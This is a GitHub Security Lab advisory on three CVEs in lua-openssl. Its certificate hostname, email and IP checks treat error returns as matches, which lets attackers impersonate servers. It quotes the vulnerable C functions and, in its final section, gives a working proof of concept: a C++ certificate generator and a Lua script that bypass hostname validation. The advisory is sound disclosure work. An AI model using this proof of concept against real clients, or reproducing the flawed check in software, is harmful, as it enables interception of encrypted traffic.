<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">March 12, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-026: Person in the middle attacks with lua-openssl</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/agustingianni">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/102623?s=35" height="35" width="35">
        <span>Agustin Gianni</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Several security issues have been found in the way <code class="language-plaintext highlighter-rouge">X509</code> certificate validation functions are exposed to LUA via the <code class="language-plaintext highlighter-rouge">check_host</code> function and others. Clients using said functions in <code class="language-plaintext highlighter-rouge">lua-openssl</code> are exposed to person-in-the-middle  attacks.</p>

<h2 id="product">Product</h2>

<p>lua-openssl</p>

<h2 id="tested-version">Tested Version</h2>

<p>All our tests were conducted on version <code class="language-plaintext highlighter-rouge">0.7.7-1</code>.</p>

<h2 id="details">Details</h2>

<p>The <code class="language-plaintext highlighter-rouge">X509_check_host</code> function is part of a collection of functions used to match certain properties of certificates. They are used to check whether a certificate matches a given host name, email address, or IP address and are available since OpenSSL 1.0.2.  In particular, the function <code class="language-plaintext highlighter-rouge">X509_check_host</code> checks if the certificate Subject Alternative Name (SAN) or Subject CommonName (CN) matches the specified host name.</p>

<p>These functions return 1 for a successful match, <code class="language-plaintext highlighter-rouge">0</code> for a failed match, <code class="language-plaintext highlighter-rouge">-1</code> for an internal error, or <code class="language-plaintext highlighter-rouge">-2</code> if the input is malformed.</p>

<h3 id="issue-1-return-value-of-x509_check_host-is-wrongly-interpreted-as-a-boolean-cve-2020-9432">Issue 1: Return value of <code class="language-plaintext highlighter-rouge">X509_check_host</code> is wrongly interpreted as a boolean (CVE-2020-9432)</h3>

<p>As can be seen in the snippet, the return value of <code class="language-plaintext highlighter-rouge">X509_check_host</code> is used in the context of a boolean, that is, its integer return value is converted to a boolean value of <code class="language-plaintext highlighter-rouge">0</code> or <code class="language-plaintext highlighter-rouge">1</code>. Converting integers to boolean values can be tricky since <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">1</code> map to <code class="language-plaintext highlighter-rouge">false</code> and <code class="language-plaintext highlighter-rouge">true</code>, but any other value, including negative integers, will map to <code class="language-plaintext highlighter-rouge">true</code>.</p>

<p>This issue makes it possible for an attacker to supply an invalid certificate that will fail to decode, that is, it will return <code class="language-plaintext highlighter-rouge">-1</code>, and the application will accept it as valid, regardless of the hostname.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="nf">LUA_FUNCTION</span><span class="p">(</span><span class="n">openssl_x509_check_host</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">X509</span> <span class="o">*</span> <span class="n">cert</span> <span class="o">=</span> <span class="n">CHECK_OBJECT</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">X509</span><span class="p">,</span> <span class="s">"openssl.x509"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lua_isstring</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">hostname</span> <span class="o">=</span> <span class="n">lua_tostring</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">lua_pushboolean</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">X509_check_host</span><span class="p">(</span><span class="n">cert</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">hostname</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">lua_pushboolean</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="issue-2-return-value-of-x509_check_email-is-wrongly-interpreted-as-a-boolean-cve-2020-9433">Issue 2: Return value of <code class="language-plaintext highlighter-rouge">X509_check_email</code> is wrongly interpreted as a boolean (CVE-2020-9433)</h3>

<p>An identical problem can be found in the following snippet but now with the function <code class="language-plaintext highlighter-rouge">X509_check_email</code>.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="nf">LUA_FUNCTION</span><span class="p">(</span><span class="n">openssl_x509_check_email</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">X509</span> <span class="o">*</span> <span class="n">cert</span> <span class="o">=</span> <span class="n">CHECK_OBJECT</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">X509</span><span class="p">,</span> <span class="s">"openssl.x509"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lua_isstring</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">email</span> <span class="o">=</span> <span class="n">lua_tostring</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">lua_pushboolean</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">X509_check_email</span><span class="p">(</span><span class="n">cert</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">email</span><span class="p">),</span> <span class="mi">0</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">lua_pushboolean</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="issue-3-return-value-of-x509_check_ip_asc-is-wrongly-interpreted-as-a-boolean-cve-2020-9434">Issue 3: Return value of <code class="language-plaintext highlighter-rouge">X509_check_ip_asc</code> is wrongly interpreted as a boolean (CVE-2020-9434)</h3>

<p>An identical problem can be found in the following snippet but now with the function <code class="language-plaintext highlighter-rouge">X509_check_ip_asc</code>.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="nf">LUA_FUNCTION</span><span class="p">(</span><span class="n">openssl_x509_check_ip_asc</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">X509</span> <span class="o">*</span> <span class="n">cert</span> <span class="o">=</span> <span class="n">CHECK_OBJECT</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">X509</span><span class="p">,</span> <span class="s">"openssl.x509"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lua_isstring</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ip_asc</span> <span class="o">=</span> <span class="n">lua_tostring</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="n">lua_pushboolean</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">X509_check_ip_asc</span><span class="p">(</span><span class="n">cert</span><span class="p">,</span> <span class="n">ip_asc</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">lua_pushboolean</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>These issues may lead to “person in the middle” attacks in which an attacker can supplant the identity of the endpoint to which the client is connecting.</p>

<h2 id="remediation">Remediation</h2>

<p>We recommend that the three affected functions are rewritten in a way such that they only return a true value (the hostname/email/ip of the certificate is valid) when each of the corresponding functions return <code class="language-plaintext highlighter-rouge">1</code>. In any other case the false value should be returned explicitly.</p>

<p>Patch can be found here <a href="https://github.com/zhaozg/lua-openssl/commit/a6dc186dd4b6b9e329a93cca3e7e3cfccfdf3cca">https://github.com/zhaozg/lua-openssl/commit/a6dc186dd4b6b9e329a93cca3e7e3cfccfdf3cca</a></p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories/#policy">coordinated disclosure policy</a>.</p>
<ul>
  <li>02/27/2020: Report sent to Vendor</li>
  <li>02/27/2020: Vendor acknowledged report</li>
  <li>02/27/2020: Vendor proposed fixes</li>
  <li>02/27/2020: Fixes reviewed and verified</li>
  <li>02/27/2020: Report published to public</li>
</ul>

<h2 id="supporting-resources">Supporting Resources</h2>

<p>The following C++ file will generate a specially crafted <code class="language-plaintext highlighter-rouge">X509</code> certificate with an invalid hostname. It will dump the file to the current directory with the name <code class="language-plaintext highlighter-rouge">invalid_cert.pem</code>.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Compiling:</span>
<span class="c1">// export PKG_CONFIG_PATH="/usr/local/opt/openssl@1.1/lib/pkgconfig"</span>
<span class="c1">// clang++ create-invalid-certificate.cpp -o create-invalid-certificate -Wall $(pkg-config --libs --cflags openssl)</span>
<span class="cp">#include &lt;cstdio&gt;
#include &lt;cassert&gt;
#include &lt;string&gt;
#include &lt;iostream&gt;
</span>
<span class="cp">#include &lt;openssl/x509v3.h&gt;
#include &lt;openssl/pem.h&gt;
#include &lt;openssl/x509.h&gt;
#include &lt;random&gt;
</span>
<span class="k">template</span> <span class="o">&lt;</span><span class="k">class</span> <span class="nc">T</span><span class="p">&gt;</span>
<span class="n">T</span> <span class="nf">get_random_int</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="n">std</span><span class="o">::</span><span class="n">random_device</span> <span class="n">rd</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">uniform_int_distribution</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">uniform_dist</span><span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">min</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;::</span><span class="n">max</span><span class="p">());</span>
    <span class="k">return</span> <span class="n">uniform_dist</span><span class="p">(</span><span class="n">rd</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span><span class="nb">true</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// Create a new key.</span>
        <span class="n">EVP_PKEY</span> <span class="o">*</span><span class="n">pkey</span> <span class="o">=</span> <span class="n">EVP_PKEY_new</span><span class="p">();</span>
        <span class="n">assert</span><span class="p">(</span><span class="n">pkey</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not create EVP_PKEY structure."</span><span class="p">);</span>

        <span class="c1">// Generate the key.</span>
        <span class="n">RSA</span> <span class="o">*</span><span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA_new</span><span class="p">();</span>
        <span class="n">assert</span><span class="p">(</span><span class="n">rsa</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not create RSA structure."</span><span class="p">);</span>

        <span class="c1">// Generate the key.</span>
        <span class="n">BIGNUM</span> <span class="o">*</span><span class="n">exponent</span> <span class="o">=</span> <span class="n">BN_new</span><span class="p">();</span>
        <span class="n">BN_set_word</span><span class="p">(</span><span class="n">exponent</span><span class="p">,</span> <span class="n">RSA_F4</span><span class="p">);</span>
        <span class="n">RSA_generate_key_ex</span><span class="p">(</span><span class="n">rsa</span><span class="p">,</span> <span class="mi">2048</span><span class="p">,</span> <span class="n">exponent</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">);</span>

        <span class="c1">// Assign it.</span>
        <span class="n">EVP_PKEY_assign_RSA</span><span class="p">(</span><span class="n">pkey</span><span class="p">,</span> <span class="n">rsa</span><span class="p">);</span>

        <span class="c1">// Create the certificate.</span>
        <span class="n">X509</span> <span class="o">*</span><span class="n">x509</span> <span class="o">=</span> <span class="n">X509_new</span><span class="p">();</span>
        <span class="n">assert</span><span class="p">(</span><span class="n">x509</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not create X509 structure."</span><span class="p">);</span>

        <span class="c1">// Fill some required fields.</span>
        <span class="n">ASN1_INTEGER_set</span><span class="p">(</span><span class="n">X509_get_serialNumber</span><span class="p">(</span><span class="n">x509</span><span class="p">),</span> <span class="mh">0xcafecafe</span><span class="p">);</span>
        <span class="n">X509_gmtime_adj</span><span class="p">(</span><span class="n">X509_get_notBefore</span><span class="p">(</span><span class="n">x509</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">X509_gmtime_adj</span><span class="p">(</span><span class="n">X509_get_notAfter</span><span class="p">(</span><span class="n">x509</span><span class="p">),</span> <span class="mh">0xdeadbeef</span><span class="p">);</span>

        <span class="c1">// Set the public key for our certificate.</span>
        <span class="n">X509_set_pubkey</span><span class="p">(</span><span class="n">x509</span><span class="p">,</span> <span class="n">pkey</span><span class="p">);</span>

        <span class="kt">unsigned</span> <span class="n">data</span> <span class="o">=</span> <span class="n">get_random_int</span><span class="o">&lt;</span><span class="kt">unsigned</span><span class="o">&gt;</span><span class="p">();</span>

        <span class="c1">// Populate the subject name.</span>
        <span class="n">X509_NAME</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="n">X509_get_subject_name</span><span class="p">(</span><span class="n">x509</span><span class="p">);</span>
        <span class="n">X509_NAME_add_entry_by_txt</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"C"</span><span class="p">,</span> <span class="n">MBSTRING_ASC</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"GH"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">X509_NAME_add_entry_by_txt</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"O"</span><span class="p">,</span> <span class="n">MBSTRING_ASC</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="s">"GitHub Security Lab"</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">X509_NAME_add_entry_by_txt</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"CN"</span><span class="p">,</span>
                                   <span class="n">data</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">,</span>
                                   <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span>
                                   <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">),</span>
                                   <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
                                   <span class="mi">0</span><span class="p">);</span>

        <span class="c1">// Now set the issuer name.</span>
        <span class="n">X509_set_issuer_name</span><span class="p">(</span><span class="n">x509</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>

        <span class="c1">// Sign the certificate.</span>
        <span class="n">assert</span><span class="p">(</span><span class="n">X509_sign</span><span class="p">(</span><span class="n">x509</span><span class="p">,</span> <span class="n">pkey</span><span class="p">,</span> <span class="n">EVP_sha1</span><span class="p">())</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not sign certificate."</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">X509_check_host</span><span class="p">(</span><span class="n">x509</span><span class="p">,</span> <span class="s">"AAAAA"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Found invalid certificate: 0x%.8x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Saving it to invalid_cert.pem</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

            <span class="kt">FILE</span> <span class="o">*</span><span class="n">x509_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"invalid_cert.pem"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">);</span>
            <span class="n">assert</span><span class="p">(</span><span class="n">x509_file</span> <span class="o">&amp;&amp;</span> <span class="s">"Could not open invalid_cert.pem"</span><span class="p">);</span>

            <span class="n">PEM_write_X509</span><span class="p">(</span><span class="n">x509_file</span><span class="p">,</span> <span class="n">x509</span><span class="p">);</span>
            <span class="n">fclose</span><span class="p">(</span><span class="n">x509_file</span><span class="p">);</span>

            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Once you have generated the invalid certificate, use the following LUA proof of concept that tries to validate the certificate against <code class="language-plaintext highlighter-rouge">github.com</code>.</p>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">openssl</span> <span class="o">=</span> <span class="nb">require</span><span class="p">(</span><span class="s1">'openssl'</span><span class="p">)</span>

<span class="k">function</span> <span class="nf">readAll</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">assert</span><span class="p">(</span><span class="nb">io.open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">))</span>
    <span class="kd">local</span> <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">"*all"</span><span class="p">)</span>
    <span class="n">f</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">content</span>
<span class="k">end</span>

<span class="k">function</span> <span class="nf">test_x509</span><span class="p">()</span>
    <span class="kd">local</span> <span class="n">certasstring</span> <span class="o">=</span> <span class="n">readAll</span><span class="p">(</span><span class="s2">"invalid_cert.pem"</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">x</span> <span class="o">=</span> <span class="n">openssl</span><span class="p">.</span><span class="n">x509</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">certasstring</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">:</span><span class="n">check_host</span><span class="p">(</span><span class="s2">"github.com"</span><span class="p">))</span>
<span class="k">end</span>

<span class="n">test_x509</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/agustingianni">@agustingianni (Agustin Gianni)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-YEAR-ID</code> in any communication regarding this issue.</p>

